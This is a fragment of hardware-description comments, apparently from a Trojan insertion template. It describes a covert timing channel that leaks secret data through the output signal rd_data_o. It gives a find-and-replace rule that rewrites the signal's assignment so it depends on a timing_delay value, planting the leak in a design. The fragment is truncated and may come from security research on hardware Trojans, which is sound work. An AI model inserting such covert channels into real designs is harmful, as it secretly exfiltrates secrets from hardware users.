 ...
 * Payload: Modulate timing of rd_data_o based on secret data
 * 
...
// ============================================================
// Covert Channel: Modulate timing of rd_data_o
//
// Integration Script Must Modify:
//
// IF rd_data_o is timing-sensitive:
//   Find: assign rd_data_o = ready_signal;
//   Replace: assign rd_data_o = (timing_delay == 0) ? ready_signal : 1'b0;
//
